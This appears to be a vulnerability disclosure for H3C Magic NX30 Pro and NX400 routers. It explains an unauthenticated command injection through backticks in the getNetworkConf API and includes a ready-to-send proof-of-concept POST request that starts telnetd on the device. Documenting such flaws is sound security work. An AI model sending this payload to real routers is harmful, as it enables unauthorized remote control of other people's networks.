# Information

**Vendor of the products:** H3C Technologies Co., Ltd.

**Vendor's website:** https://www.h3c.com/

**Reported by:** Du Guang Xu(2113115252@qq.com)，Yang Ke Yan(1670227058@qq.com)

**Affected products:** H3C Magic NX30 Pro\H3C NX400

**Affected firmware version:** <=V100R014 

**Firmware download address:** [H3C NX15V100R014](https://www.h3c.com/cn/d_202409/2263952_30005_0.htm)

# Overview

In the `H3C Magic` series products, `H3C Magic NX30 Pro` and `H3C NX400` allow an attacker to send a specially crafted `POST` request to the `/api/wizard/getNetworkConf` route without authorization, enabling remote code execution with the highest privileges.



# Vulnerability details

When the route is `/wizard/getNetworkConf`, it can enter its handler function.

![image-20250314113745284](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250314113745284.png)

`v14` is user-controllable. Although the `FCGI_CheckStringIfContainsSemicolon` function is used to filter dangerous characters, it fails to filter backticks, leading to command injection.

![image-20250314113946900](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250314113946900.png)



# POC

```
POST /api/wizard/getNetworkConf HTTP/1.1
Host: 192.168.124.1
Content-Length: 11
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Origin: http://192.168.124.1
Referer: http://192.168.124.1/home
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

'`telnetd`'
```

